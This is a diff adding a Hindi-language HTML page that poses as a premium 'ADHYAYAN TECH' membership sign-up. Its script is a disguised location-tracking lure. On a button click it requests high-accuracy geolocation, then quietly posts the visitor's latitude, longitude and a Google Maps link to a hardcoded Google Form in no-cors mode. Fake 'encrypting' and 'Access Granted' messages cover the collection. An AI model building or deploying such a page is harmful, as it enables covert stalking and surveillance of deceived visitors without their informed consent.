@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>High-Tech Technology Experiment | Premium</title>
+    <style>
+        /* --- प्रीमियम थीम सेटिंग्स --- */
+        :root {
+            --bg: #080a0c;
+            --cyan: #00f2fe;
+            --blue: #4facfe;
+            --glass: rgba(255, 255, 255, 0.03);
+            --border: rgba(0, 242, 254, 0.2);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: var(--bg);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* डायमंड कट एनिमेटेड बैकग्राउंड */
+        .bg-glow {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 50%, rgba(0, 242, 254, 0.05), transparent);
+            z-index: -1;
+        }
+
+        /* नेविगेशन बार */
+        nav {
+            padding: 20px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 900;
+            letter-spacing: 2px;
+            color: var(--cyan);
+            text-shadow: 0 0 10px var(--cyan);
+        }
+
+        /* मेन कार्ड */
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .premium-card {
+            background: var(--glass);
+            padding: 50px 30px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            text-align: center;
+            max-width: 500px;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            position: relative;
+            transition: 0.5s;
+        }
+
+        .premium-card:hover {
+            border-color: var(--cyan);
+            box-shadow: 0 0 30px rgba(0, 242, 254, 0.2);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            background: linear-gradient(to right, #fff, var(--cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+        }
+
+        p {
+            font-size: 1.1rem;
+            opacity: 0.7;
+            margin-bottom: 35px;
+            line-height: 1.6;
+        }
+
+        /* प्रीमियम बटन */
+        .btn {
+            background: transparent;
+            border: 2px solid var(--cyan);
+            color: var(--cyan);
+            padding: 18px 45px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: 0.4s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover {
+            background: var(--cyan);
+            color: #000;
+            box-shadow: 0 0 40px var(--cyan);
+        }
+
+        /* स्टेटस मैसेज */
+        #status-box {
+            margin-top: 25px;
+            font-size: 0.9rem;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .loading { color: var(--cyan); animation: pulse 1.5s infinite; }
+        .success { color: #00ff00; border: 1px solid #00ff0033; background: #00ff0011; }
+        .error { color: #ff4b4b; border: 1px solid #ff4b4b33; background: #ff4b4b11; }
+
+        @keyframes pulse { 50% { opacity: 0.5; } }
+    </style>
+</head>
+<body>
+
+    <div class="bg-glow"></div>
+
+    <nav>
+        <div class="logo">ADHYAYAN TECH</div>
+        <div style="font-size: 0.8rem; opacity: 0.5;">VERSION 2.0</div>
+    </nav>
+
+    <div class="main-container">
+        <div class="premium-card">
+            <h1>NEW MEMBERSHIP</h1>
+            <p>भविष्य की तकनीक का अनुभव करें। हमारे हाई-टेक एक्सपेरिमेंट लैब में शामिल होने के लिए नीचे बटन दबाएं।</p>
+            
+            <button class="btn" onclick="runExperiment()">प्रवेश करें</button>
+            
+            <div id="status-box"></div>
+        </div>
+    </div>
+
+    <script>
+        function runExperiment() {
+            const box = document.getElementById('status-box');
+            box.style.display = "block";
+            box.className = "loading";
+            box.innerText = "सिस्टम रिक्वेस्ट भेज रहा है... कृपया लोकेशन 'Allow' करें";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(processData, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
+            } else {
+                showFinalStatus("error", "आपका डिवाइस इस तकनीक को सपोर्ट नहीं करता।");
+            }
+        }
+
+        function processData(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            // फिक्स्ड मैप लिंक सिंटैक्स
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            showFinalStatus("loading", "डेटा एन्क्रिप्ट हो रहा है...");
+
+            // --- आपकी IDs यहाँ फिक्स कर दी गई हैं ---
+            const fID = "13PWhPGu1sf5LJ4pQciECidVdNP0UMOidIww4DP05cw";
+            const formAction = `https://docs.google.com/forms/d/e/${fID}/formResponse`;
+
+            const data = new FormData();
+            data.append("entry.1688187415", lat); 
+            data.append("entry.1878723488", lon); 
+            data.append("entry.1440360866", mapLink); 
+
+            fetch(formAction, {
+                method: "POST",
+                mode: "no-cors",
+                body: data
+            }).then(() => {
+                showFinalStatus("success", "प्रीमियम एक्सेस वेरीफाई हो गया! स्वागत है।");
+                alert("Welcome! Access Granted.");
+            }).catch(() => {
+                showFinalStatus("error", "सर्वर बिजी है, कृपया दोबारा प्रयास करें।");
+            });
+        }
+
+        function showFinalStatus(type, msg) {
+            const box = document.getElementById('status-box');
+            box.className = type;
+            box.innerText = msg;
+        }
+
+        function handleError(err) {
+            showFinalStatus("error", "एक्सेस डिनाइड: कृपया लोकेशन सेटिंग ऑन करें।");
+        }
+    </script>
+</body>
+</html>
